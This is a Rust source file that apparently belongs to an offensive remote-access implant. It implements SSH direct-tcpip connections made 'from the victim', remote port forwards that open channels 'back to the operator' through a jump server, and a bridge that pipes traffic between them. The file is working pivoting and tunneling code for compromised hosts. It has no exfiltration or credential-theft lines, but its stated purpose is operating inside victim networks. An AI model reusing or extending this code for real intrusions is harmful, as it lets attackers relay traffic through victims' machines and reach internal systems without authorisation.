use russh::server::{Handle, Msg};
use russh::{Channel, ChannelMsg};
use std::collections::HashMap;
use std::sync::{Arc, Mutex, OnceLock};
use tokio::io::AsyncWriteExt;
use tokio::net::{TcpListener, TcpStream};

type ForwardMap = Arc<Mutex<HashMap<(String, u32), tokio::task::JoinHandle<()>>>>;

fn registry() -> ForwardMap {
    static REG: OnceLock<ForwardMap> = OnceLock::new();
    Arc::clone(REG.get_or_init(|| Arc::new(Mutex::new(HashMap::new()))))
}

/// direct-tcpip: dial a TCP target from the victim and bridge it into the channel.
pub async fn direct_tcpip(channel: Channel<Msg>, host: String, port: u32) {
    let mut ch = channel;
    let addr = format!("{host}:{port}");
    let tcp = match TcpStream::connect(&addr).await {
        Ok(t) => t,
        Err(_) => {
            let _ = ch.close().await;
            return;
        }
    };
    let _ = tcp.set_nodelay(true);
    bridge(ch, tcp).await;
}

/// Bridge an SSH channel with any duplex stream.
pub async fn bridge<S>(ch: Channel<Msg>, stream: S)
where
    S: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send + 'static,
{
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    let (reader, writer) = ch.split();
    let mut reader = reader;
    let writer = std::sync::Arc::new(writer);
    let (mut r, mut w) = tokio::io::split(stream);

    let mut t_out = {
        let writer = writer.clone();
        tokio::spawn(async move {
            let mut buf = vec![0u8; 16 * 1024];
            loop {
                match r.read(&mut buf).await {
                    Ok(0) | Err(_) => break,
                    Ok(n) => {
                        if writer.data_bytes(buf[..n].to_vec()).await.is_err() {
                            break;
                        }
                    }
                }
            }
            let _ = writer.eof().await;
            let _ = writer.close().await;
        })
    };

    let mut t_in = tokio::spawn(async move {
        loop {
            match reader.wait().await {
                Some(ChannelMsg::Data { ref data }) => {
                    if w.write_all(data).await.is_err() {
                        break;
                    }
                }
                Some(ChannelMsg::Eof) | None => break,
                _ => {}
            }
        }
        let _ = w.shutdown().await;
    });

    tokio::select! {
        _ = &mut t_out => t_in.abort(),
        _ = &mut t_in => t_out.abort(),
    }
}

/// tcpip-forward (from the operator via jump server): listen locally, and for
/// each accepted connection open a "forwarded-tcpip" channel back to the operator.
pub async fn start_remote_forward(
    handle: Handle,
    address: String,
    port: &mut u32,
) -> Result<(), String> {
    let bind_addr = if address.is_empty() || address == "localhost" {
        "127.0.0.1".to_string()
    } else {
        address.clone()
    };
    let listener = TcpListener::bind((bind_addr.as_str(), *port as u16))
        .await
        .map_err(|e| e.to_string())?;

    if *port == 0 {
        *port = listener
            .local_addr()
            .map_err(|e| e.to_string())?
            .port() as u32;
    }

    let key = (address.clone(), *port);
    let key2 = key.clone();
    let task = tokio::spawn(async move {
        loop {
            let Ok((tcp, _peer)) = listener.accept().await else {
                break;
            };
            let _ = tcp.set_nodelay(true);
            let handle = handle.clone();
            let (host, port) = key2.clone();
            tokio::spawn(async move {
                if let Ok(ch) = handle
                    .channel_open_forwarded_tcpip(host.clone(), port, "127.0.0.1", 0)
                    .await
                {
                    bridge(ch, tcp).await;
                }
            });
        }
    });

    registry().lock().unwrap().insert(key, task);
    Ok(())
}

pub fn stop_remote_forward(address: &str, port: u32) {
    let key = (address.to_string(), port);
    if let Some(task) = registry().lock().unwrap().remove(&key) {
        task.abort();
    }
}

pub fn stop_all() {
    let reg = registry();
    let mut guard = reg.lock().unwrap();
    for (_, t) in guard.drain() {
        t.abort();
    }
}
